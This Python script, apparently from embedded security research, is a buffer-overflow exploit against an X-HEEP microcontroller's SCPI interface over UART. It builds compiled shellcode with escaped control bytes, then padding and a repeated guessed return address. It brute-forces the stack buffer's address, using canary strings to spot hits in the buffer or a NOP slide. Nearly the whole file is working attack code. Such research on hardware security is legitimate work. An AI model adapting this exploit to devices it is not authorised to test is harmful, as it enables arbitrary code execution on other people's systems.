# ================================================================================
# Copyright 2024 Antonio Porsia

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
# ================================================================================

import serial
import sys
import struct
import os.path
import codecs

ESCAPE = b"\x5C"
CANARY_1 = "ABCD"
CANARY_2 = "ACAC"

os.system("screen -X -S uart quit")
os.system("./compile.sh find_start_of_buffer.s")

with open("find_start_of_buffer.txt", "r") as f:
  hexdump = bytes.fromhex(f.read().strip())
  p_len = len(hexdump)
  p_list = [ESCAPE + hexdump[i:i+1] if hexdump[i] < 0x20 else hexdump[i:i+1] for i in range(p_len)]
  payload = b''.join(p_list)

cmd_prefix = b"NN:INFER:DATA? #41048"
f = open("xheep_uart_dump.bin", "wb")

tty = serial.Serial("/dev/ttyPS1", 115200, timeout=15, write_timeout=15)

starting_addr = int(sys.argv[1], base=16)
step = 0x200
found = False

print("Step size: 0x{:X}".format(step))
for addr in range(starting_addr, 0x40000, -step):
    print("Trying address: 0x{:08X}".format(addr))
    
    packed_addr = struct.pack('<I', addr)
    padding = b"A" * (1024 - p_len)
    cmd_str = cmd_prefix + payload + padding + packed_addr * 6 + b"\n"
    
    tty.write(cmd_str)
    tty.flush()
    
    out = b""
    while True:
        try:
            r = tty.read(2048)  
            out += r
            if "Starting SCPI loop..." in out.decode('ascii', errors='replace'):
                break
        except serial.SerialTimeoutException:
            print("X-HEEP probably hanged, restart it, then press enter")
            input()
            break
    
    f.write(out)
    ascii_out = out.decode('ascii', errors='replace')
    
    if CANARY_1 in ascii_out:
        print("Found start of buffer at 0x{:08X}".format(addr))
        found = True
        break
    elif CANARY_2 in ascii_out:
        print("Jumped inside NOP slide at address 0x{:08X}".format(addr))
        starting_addr = addr
        break
if not found:
    step = 0x10
    while not found:
        if step == 1:
            print("Start of buffer cannot be found")
            break
        print("Trying step size {}".format(step))
        for i in range(addr, addr - 1024, -step):
            print("Trying address: 0x{:08X}".format(i))
            
            packed_addr = struct.pack('<I', i)
            padding = b"A" * (1024 - p_len)
            cmd_str = cmd_prefix + payload + padding + packed_addr * 6 + b"\n"
            
            success = False
            while not success:
                try:
                    tty.write(cmd_str)
                    tty.flush()
                    success = True
                except serial.SerialTimeoutException:
                    print("X-HEEP probably hanged, restart it, then press enter (Remember to run 'screen -X -S uart quit' before)")
                    input()

            out = b""
            while True:
                try:
                    r = tty.read(2048)  
                    out += r
                    if "Starting SCPI loop..." in out.decode('ascii', errors='replace'):
                        break
                except serial.SerialTimeoutException:
                    print("X-HEEP probably hanged, restart it, then press enter")
                    input()
                    break

            f.write(out)
            ascii_out = out.decode('ascii', errors='replace')
            if CANARY_1 in ascii_out:
                print("Found start of buffer at 0x{:08X}".format(i))
                found = True
                break
        step //= 2
f.close()
